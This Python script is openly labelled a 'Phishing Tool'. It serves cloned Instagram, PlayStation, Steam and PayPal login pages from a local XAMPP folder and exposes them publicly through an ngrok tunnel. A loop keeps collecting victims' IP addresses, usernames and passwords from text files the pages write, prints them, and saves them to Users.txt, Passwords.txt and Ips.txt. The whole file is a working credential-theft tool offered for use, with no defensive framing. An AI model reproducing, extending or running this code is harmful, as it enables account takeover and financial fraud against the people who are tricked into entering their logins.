from pyngrok import ngrok
from colorama import Fore, init 
import os
from os import path
import time
from shutil import rmtree

init(convert=True)

ruta = 'C:\%xampp\%php\%www'

v = '1.0'
r = Fore.LIGHTRED_EX
g = Fore.LIGHTGREEN_EX
c = Fore.LIGHTCYAN_EX
y = Fore.LIGHTYELLOW_EX
e = Fore.LIGHTBLUE_EX

a = []
b = []
holas = []

otaku = 0
asd = 0
dsa = 0
fds = 0
xcd = 0
jajaj = 0 


def clear():
    os.system('cls')

def menu():
    clear()
    fix = ruta.replace('%', '')
    if (path.exists(fix)):
        pass
    else:
        os.mkdir(fix)
    print(f'''
    {c}Phishing Tool 

    {r}Coded By {g}CrIsTiiAnPvP

    {y}version: {e}{v}


    {r}[1] {y}Instagram
    {r}[2] {y}PlayStation
    {r}[3] {y}Steam
    {r}[4] {y}PayPal ({c}Nuevo!{Fore.RESET}{y})
    
    {Fore.RESET}
    ''')
    print()

    eleccion = input(c+'Select One: '+Fore.RESET+'')
    try:
        i = int(eleccion)
    except:
        pass

    try:
        if (i == 1):
            instagram()
        if (i == 2):
            play()
        if (i == 3):
            steam()
        if (i == 4):
            paypal()
        else:
            print(c+'La opcion '+r+i+c+' no existe')
            time.sleep(1)
            menu()

    except:
        pass

def instagram():
    try:
        fix = ruta.replace('%', '')
        carpeta = '.\Pages\instagram\*'
        comando = f'XCOPY {carpeta} {fix} /s'
        os.system(comando)
    finally:
        clear()
        empezar_ngrok()

def paypal():
    try:
        fix = ruta.replace('%', '')
        carpeta = '.\Pages\paypal\*'
        comando = f'XCOPY {carpeta} {fix} /s'
        os.system(comando)
    finally:
        clear()
        empezar_ngrok()


def play():
    try:
        fix = ruta.replace('%', '')
        carpeta = '.\Pages\playstation\*'
        comando = f'XCOPY {carpeta} {fix} /s'
        os.system(comando)
    finally:
        clear()
        empezar_ngrok()


def steam():
    try:
        fix = ruta.replace('%', '')
        carpeta = '.\Pages\steam\*'
        comando = f'XCOPY {carpeta} {fix} /s'
        os.system(comando)
    finally:
        clear()
        empezar_ngrok()


def ip():
    ruta2 = 'C:\%xampp\%php\%www\%'
    fix = ruta2.replace('%', '')
    try:
        if (path.isfile(f'{fix}ip.txt')):
            try:
                archivo = open(f'{fix}ip.txt', 'r')
                lineas = archivo.read()
                if (lineas != '' and lineas != ' ' and lineas != '\n'):
                    print()
                    print(f'{y}IP: {c}{lineas}')
                    archivo.close()
                    global otaku
                    otaku = otaku + 1
                    global holas
                    holas.append(f'{otaku}. IP: {lineas}\n')
                    archivo.close()
                    borrar = open(f'{fix}ip.txt', 'w')
                    borrar.write('')
                    borrar.close()
                else:
                    pass
            except:
                pass
        else:
            time.sleep(3)
            ip()
    except:
        pass

def email():
    ruta2 = 'C:\%xampp\%php\%www\%'
    fix = ruta2.replace('%', '')
    try:
        if (path.isfile(f'{fix}usernames.txt')):
            try:
                archivo = open(f'{fix}usernames.txt', 'r')
                lineas = archivo.read()
                if (lineas != '' and lineas != ' ' and lineas != '\n'):
                    print()
                    print(f'{y}User: {c}{lineas}')
                    global dsa
                    dsa = dsa + 1
                    global a
                    a.append(f'{dsa}. User: {lineas}\n')
                    archivo.close()
                    borrar = open(f'{fix}usernames.txt', 'w')
                    borrar.write('')
                    borrar.close()
                else:
                    pass
            except:
                pass
        else:
            time.sleep(3)
            email()
    except:
        pass

def passwd():
    ruta2 = 'C:\%xampp\%php\%www\%'
    fix = ruta2.replace('%', '')
    try:
        if (path.isfile(f'{fix}contrasenas.txt')):
            try:
                archivo = open(f'{fix}contrasenas.txt', 'r')
                lineas = archivo.read()
                if (lineas != '' and lineas != ' ' and lineas != '\n'):
                    print()
                    print(f'{y}Password: {c}{lineas}')
                    global asd
                    asd = asd + 1 
                    global b
                    b.append(f'{asd}. Pass: {lineas}\n')
                    archivo.close()
                    borrar = open(f'{fix}contrasenas.txt', 'w')
                    borrar.write('')
                    borrar.close()
                else:
                    pass
            except:
                pass
        else:
            time.sleep(3)
            passwd()
    except:
        pass

def empezar_ngrok():
    
    puerto = 80
    try:
        tunnel = ngrok.connect(puerto, 'http')
        ngrok_process = ngrok.get_ngrok_process()
        todo = ngrok.get_tunnels()
        string = str(todo[1])
        string2 = string.replace('NgrokTunnel: ', '')
        string3 = string2.replace('"', '')
        string4 = string3.replace(' -> http://localhost:80', '')
        print(Fore.LIGHTRED_EX+'Ngrok Iniciado url: '+Fore.LIGHTGREEN_EX+string4)

        x = 10000

        while (x >= 0):
            try:
                ip()
                email()
                passwd()
                x = x - 1 
                time.sleep(3)
            except:
                time.sleep(3) 
                pass

        ngrok_process.proc.wait()


    except KeyboardInterrupt:
        print()
        try:
            try:
                if (path.isfile('./Users.txt')):
                    global xcd
                    xcd = xcd + 1
                    with open(f'./{xcd}. Users.txt', 'w') as fal:
                        fal.writelines(a)
                else:
                    with open('./Users.txt', 'w') as fa:
                        fa.writelines(a)
            except:
                pass
            try:
                if (path.isfile('./Passwords.txt')):
                    global fds
                    fds = fds + 1
                    with open(f'./{fds}. Passwords.txt', 'w') as pol:
                        pol.writelines(b)
                else: 
                    with open('./Passwords.txt', 'w') as po:
                        po.writelines(b)
            except:
                pass
            try:
                if (path.isfile('./Ips.txt')):
                    global jajaj
                    jajaj = jajaj + 1
                    with open(f'./{jajaj}. Ips.txt', 'w') as ips:
                        ips.writelines(holas)
                else:
                    with open('./Ips.txt', 'w')as ipa:
                        ipa.writelines(holas)
            except:
                pass
        finally:
            print(f'{Fore.LIGHTRED_EX}Cerrando Ngrok...')
            ngrok.kill()
            fixed = ruta.replace('%', '')
            rmtree(fixed)
            os.mkdir(fixed)
            time.sleep(1.5)
            menu()

if __name__ == '__main__':
    menu()
